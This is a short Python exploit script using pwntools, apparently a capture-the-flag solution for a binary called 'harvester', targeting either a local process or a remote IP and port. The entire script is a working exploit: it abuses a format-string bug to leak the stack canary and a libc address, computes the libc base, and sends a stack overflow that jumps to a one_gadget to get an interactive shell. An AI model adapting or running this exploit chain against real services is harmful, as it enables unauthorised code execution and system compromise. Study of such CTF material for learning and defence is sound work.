from pwn import *

binary = context.binary = ELF('./harvester')

if args.REMOTE:
        libc = ELF('./libc.so.6')
        p = remote('188.166.172.13',30231)
else:
	# When we running locally use this libc, in remote we will use the attached libc
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process(binary.path)


def leak(stack_pos):
    print(p.recvuntil('>').decode('utf-8'))
    print("1")
    p.sendline("1")
    print(p.recvuntil('>').decode('utf-8'))
    print("%" + str(stack_pos) + "$p")
    p.sendline("%"+str(stack_pos)+"$p")
    print(p.recvuntil('is: ').decode('utf-8'))
    leak = int(p.recvuntil('\x1b[1;').strip(b'\x1b[1;').decode(),16)
    print(leak)
    return leak

canary = leak(11) # Leak canary value located on 11th on stack
log.info("Canary value: " + hex(canary))

libc_start_offset = 231
libc_start_main = leak(21) # Leak <__libc_start_main+231> address - we need to sub 231 later 
libc.address = libc_start_main - libc_start_offset - libc.sym.__libc_start_main
log.info("libc.address: " + hex(libc.address))


one_gadget = libc.address + 0x4f3d5 #0x4f3d5 # taked from one_gadget libc.so.6

payload = b"A"*(0x38-0x10) + p64(canary) + 'A'*8 + p64(one_gadget) 

#Set pie to 21
print(p.recvuntil('>').decode('utf-8'))
print("2")
p.sendline("2")
print(p.recvuntil('>').decode('utf-8'))
print("y")
p.sendline("y")
print(p.recvuntil('>').decode('utf-8'))
print("-11")
p.sendline("-11")

print(p.recvuntil('>').decode('utf-8'))
print("3")
p.sendline("3")
print(p.recvuntil('>').decode('utf-8'))
p.sendline(payload)

p.interactive()